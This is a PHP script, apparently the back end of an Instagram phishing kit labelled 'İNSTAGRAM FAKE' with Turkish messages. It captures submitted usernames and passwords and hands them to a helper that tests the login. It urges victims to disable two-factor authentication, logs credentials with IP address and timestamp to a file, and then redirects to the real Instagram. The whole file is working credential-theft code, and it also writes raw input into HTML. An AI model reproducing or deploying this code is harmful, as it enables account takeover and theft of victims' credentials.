<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
	$save = fopen("_command","w");
	$username = $_POST['username'];
	$password = $_POST['password'];
	$vericekilen = ("Loginn\n$username $password");
	fwrite($save,$vericekilen);
	fclose($save);
	sleep(5);
	$output = shell_exec('cat output');
	if (preg_match("(true)", $output)){
		unlink("output");
		//echo "<script>alert('Giriş yapıldı.')</script>";

	}
	if (preg_match("(false)", $output)){
		unlink("output");
		echo "<script>alert('[!] Kullanıcı Adınız veya Şifreniz Hatalı')</script>";
		echo "<script>javascript:history.go(-1)</script>";
		exit();
	}
	if (preg_match("(two)", $output)){
		unlink("output");
		echo "<script>alert('[!] İşlemi Tamamlamak için 2 Adımlı Doğrulamayı Kapatıp Tekrar Deneyiniz')</script>";
		echo "<script>javascript:history.go(-1)</script>";
		exit();
		
	}
}else{
	echo "<script>javascript:history.go(-1)</script>";
	exit();
}
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['username']) && isset($_POST['password'])) {



$save = fopen("_command","w");
$save_2 = fopen("saved_info.txt","a+");
$username = $_POST['username'];
$password = $_POST['password'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("
+-+-+ İNSTAGRAM FAKE +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

 Kullanıcı Adı : ".$username."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
$saved_info = ("
<ul class='saved-box'>
	<li class='saved-title'>İNSTAGRAM FAKE</li><br>
	<li>Tarih         : <a>$tarih</a></li>
	<li>İp Adresi     : <a href='/ip-scan/index.php?ip=$ipaddress'>$ipaddress</a></li>
	<li>Kullanıcı Adı : <a>$username</a></li>
	<li>Şifre         : <a>$password</a></li>
</ul><hr><br>
");
fwrite($save,$command);
fwrite($save_2,$saved_info);
fclose($save);
fclose($save_2);
header('Location: https://instagram.com');
}

?>
